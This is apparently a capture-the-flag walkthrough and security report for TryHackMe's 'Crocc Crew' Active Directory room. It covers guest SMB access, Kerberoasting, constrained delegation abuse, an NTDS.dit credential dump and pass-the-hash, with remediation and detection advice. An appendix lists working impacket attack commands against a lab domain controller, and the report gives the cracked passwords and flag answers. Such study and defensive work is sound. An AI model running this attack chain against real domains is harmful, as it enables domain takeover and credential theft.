# Crocc Crew - Walkthrough & Security Assessment Report

## Room Info
- **Platform:** TryHackMe
- **Target:** 10.129.167.59 (DC.COOCTUS.CORP)
- **Room Type:** Active Directory / Windows Domain Controller
- **Date Solved:** 2026-04-28
- **OS:** Windows Server 2019 (10.0.17763)

## Objectives & Status
- [x] What is the User flag?
- [x] What is the name of the account Crocc Crew planted?
- [x] What is the Privileged User's flag?
- [x] What is the Second Privileged User's flag?
- [x] What is the Root flag?

---

## Executive Summary

Crocc Crew is an Active Directory-focused room centered on a compromised Windows Server 2019 Domain Controller. Initial access was gained via weak guest SMB credentials (`Visitor:GuestLogin!`), leading to discovery of a Kerberoastable service account (`password-reset`) configured with **constrained delegation with protocol transition**. Cracking the Kerberos TGS and abusing delegation (S4U2self/S4U2proxy) allowed impersonation of the Domain Administrator, full NTDS.dit extraction, and compromise of all domain credentials.

---

## Exploitation Chain

1. **Reconnaissance:** Nmap scan identified standard DC services (SMB, LDAP, Kerberos, IIS, RDP) and a web server hosting `db-config.bak` and `robots.txt`.
2. **Initial Access:** SMB guest/null enumeration succeeded with `Visitor:GuestLogin!`, revealing readable shares and the `user.txt` flag in `\\Shares\Home\`.
3. **Credential Harvesting:** `impacket-GetUserSPNs` revealed `password-reset` as Kerberoastable. John the Ripper cracked the TGS to `resetpassword`.
4. **Privilege Escalation:** `impacket-findDelegation` confirmed `password-reset` has `TRUSTED_TO_AUTH_FOR_DELEGATION` to `oakley/DC.COOCTUS.CORP`. Using `getST.py` with S4U2self/S4U2proxy, an Administrator service ticket was obtained.
5. **Domain Compromise:** The Administrator ticket was used with `impacket-secretsdump` (DRSUAPI) to extract the full NTDS.dit. Domain hashes were cracked offline, and admin-level SMB access retrieved the root flag from `C:\PerfLogs\Admin\root.txt`.

---

## Vulnerability Details

### VULN-01: Weak Guest / Null SMB Authentication
- **Vulnerable Location:** SMB (port 445) on DC.COOCTUS.CORP
- **Overview:** The domain allows guest authentication with the trivial password `GuestLogin!` on the `Visitor` account, exposing domain enumeration capabilities and share access.
- **Impact:** Full domain user enumeration, share listing, and file read access (including the initial user flag and `db-config.bak`).
- **Severity:** High
- **Remediation:** Disable guest accounts, enforce strong password policies, disable null/guest SMB authentication, and restrict anonymous enumeration via GPO (`Network access: Do not allow anonymous enumeration of SAM accounts and shares`).
- **NVD Reference:** [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)

### VULN-02: Kerberoastable Service Account with Weak Password
- **Vulnerable Location:** Active Directory SPN on `password-reset` (HTTP/dc.cooctus.corp)
- **Overview:** The `password-reset` account is assigned an SPN, making it Kerberoastable. Its password (`resetpassword`) is trivially cracked.
- **Impact:** Disclosure of service account credentials, enabling lateral movement and delegation abuse.
- **Severity:** High
- **Remediation:** Remove unnecessary SPNs, enforce long/random service account passwords (20+ characters), rotate regularly, and monitor for Kerberoasting (Event ID 4769).
- **NVD Reference:** [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

### VULN-03: Constrained Delegation with Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION)
- **Vulnerable Location:** Active Directory user object `password-reset`
- **Overview:** The `password-reset` account is configured with constrained delegation and protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`), allowing an attacker with its credentials to impersonate any user (including Administrator) via S4U2self/S4U2proxy without requiring the target user's credentials.
- **Impact:** Direct privilege escalation from service account to Domain Admin.
- **Severity:** Critical
- **Remediation:** Audit all delegation settings; remove protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) unless strictly required. Use resource-based constrained delegation (RBCD) with tight ACLs instead. Monitor for anomalous S4U2self/S4U2proxy events.
- **NVD Reference:** [CVE-2020-17049](https://nvd.nist.gov/vuln/detail/CVE-2020-17049) (Kerberos Bronze Bit attack — related delegation weakness) / [Microsoft: Kerberos Constrained Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)

### VULN-04: Sensitive File Exposure in Web Root
- **Vulnerable Location:** IIS web root (`C:\inetpub\wwwroot`)
- **Overview:** `db-config.bak` and `robots.txt` are exposed via HTTP, leaking database credentials (`C00ctusAdm1n:B4dt0th3b0n3`) and directory structure.
- **Impact:** Disclosure of application credentials and reconnaissance aid.
- **Severity:** Medium
- **Remediation:** Remove backup/config files from production web roots, use `.htaccess` or IIS request filtering to block `.bak`, `.config`, `.txt` access, and scan deployments before release.
- **NVD Reference:** [CWE-548: Exposure of Information Through Directory Listing](https://cwe.mitre.org/data/definitions/548.html)

### VULN-05: Planted Backdoor Account (admCroccCrew)
- **Vulnerable Location:** Active Directory
- **Overview:** A rogue account `admCroccCrew` was planted in the domain with a weak, crackable password (`banana12345`), indicating prior compromise and persistence.
- **Impact:** Persistent unauthorized access to the domain.
- **Severity:** High
- **Remediation:** Implement regular AD account audits, detect anomalous account creation (Event ID 4720), enforce privileged access workstations (PAW), and deploy Microsoft Defender for Identity / ATA for anomaly detection.
- **NVD Reference:** [CWE-250: Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html)

---

## Loot & Flags

| Flag | Location | Value |
|------|----------|-------|
| User flag | `C:\Shares\Home\user.txt` | `THM{Gu3st_Pl3as3}` |
| Planted account | Active Directory | `admCroccCrew` |
| Privileged User's flag | `C:\Shares\Home\priv-esc.txt` | `THM{0n-Y0ur-Way-t0-DA}` |
| Second Privileged User's flag | `C:\Shares\Home\priv-esc-2.txt` | `THM{Wh4t-t0-d0...Wh4t-t0-d0}` |
| Root flag | `C:\PerfLogs\Admin\root.txt` | `THM{Cr0ccCrewStr1kes!}` |

---

## Senior-Level Lessons Learned

### Strategic Takeaways
1. **Guest access is never harmless on a DC.** Even "low-privilege" guest/null SMB access provides domain enumeration capabilities that feed directly into credential attacks (Kerberoasting, AS-REP roasting).
2. **Delegation is a privilege escalation highway.** Constrained delegation with protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) effectively grants domain admin rights to any compromised service account. Treat these accounts as Tier-0.
3. **Kerberoasting is still a top-3 AD kill chain step.** Any Kerberoastable account with a human-crackable password is a guaranteed escalation path. Service accounts should use Managed Service Accounts (gMSA) or long random passwords rotated by a vault.

### Real-World Context & Defense
- **Threat Landscape:** These exact weaknesses (weak guest creds + Kerberoastable SPN + delegation abuse) are common in post-compromise scenarios. APT groups (e.g., APT29, FIN7) routinely abuse delegation and Kerberoasting for lateral movement.
- **Detection Engineering:**
  - Monitor Event ID 4769 for unusual TGS requests (Kerberoasting).
  - Monitor Event ID 4769 with `TicketOptions` containing `0x40810010` (S4U2proxy) and Event ID 4769 with `0x50810000` (S4U2self).
  - Alert on `TRUSTED_TO_AUTH_FOR_DELEGATION` modifications (Event ID 4742 / 5136).
  - Detect NTDS.dit extraction via DRSUAPI (Event ID 4662 with `Replicating Directory Changes` access).
- **System Hardening:**
  - Apply CIS Benchmarks for Windows Server 2019 (disable guest, enforce password length, audit delegation).
  - Implement LAPS for local admin passwords.
  - Use Attack Surface Reduction (ASR) rules and Protected Users security group for sensitive accounts.
  - Enable SMB signing and require it (already enabled here, but guest bypass negated much of its value).

---

## Technical Appendix: Commands Worth Keeping

```bash
# === Recon ===
nmap -sC -sV -p- --min-rate 1000 10.129.167.59 -oN crocc-nmap.txt
smbclient -L //10.129.167.59 -U 'Visitor%GuestLogin!'

# === Domain Enumeration ===
rpcclient -U 'Visitor%GuestLogin!' 10.129.167.59 -c 'enumdomusers'
impacket-GetUserSPNs 'COOCTUS.CORP/Visitor:GuestLogin!' -dc-ip 10.129.167.59 -request
impacket-findDelegation 'COOCTUS.CORP/Visitor:GuestLogin!' -dc-ip 10.129.167.59

# === Kerberoasting ===
john --wordlist=/usr/share/wordlists/rockyou.txt crocc-krb.hash

# === Constrained Delegation Abuse ===
# Get TGT for delegation account
impacket-getTGT 'COOCTUS.CORP/password-reset:resetpassword' -dc-ip 10.129.167.59
# Abuse S4U2self/S4U2proxy to impersonate Administrator
KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME=password-reset.ccache impacket-getST \
  -spn oakley/DC.COOCTUS.CORP -impersonate administrator \
  'COOCTUS.CORP/password-reset:resetpassword' -dc-ip 10.129.167.59

# === NTDS Dump ===
KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME=administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache \
  impacket-secretsdump -k -no-pass 'COOCTUS.CORP/administrator@dc.cooctus.corp' -target-ip 10.129.167.59

# === Pass-the-Hash Execution ===
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:HASH \
  'COOCTUS.CORP/administrator@10.129.167.59' 'cmd /c type C:\Shares\Home\user.txt'

# === Custom krb5.conf (no /etc/hosts edits needed) ===
cat > /tmp/krb5.conf <<'EOF'
[libdefaults]
    dns_lookup_realm = false
    dns_lookup_kdc = false
[realms]
    COOCTUS.CORP = {
        kdc = 10.129.167.59:88
        admin_server = 10.129.167.59
    }
EOF
```

## Tools Used
- `nmap` — port scanning and service enumeration
- `smbclient` / `impacket-smbclient` — SMB share enumeration and file access
- `rpcclient` — domain user enumeration
- `impacket-GetUserSPNs` — Kerberoasting
- `impacket-findDelegation` — delegation configuration audit
- `john` — password cracking
- `impacket-getTGT` / `impacket-getST` — Kerberos ticket manipulation and delegation abuse
- `impacket-secretsdump` — NTDS.dit extraction via DRSUAPI
- `impacket-wmiexec` — remote command execution with hash/ticket
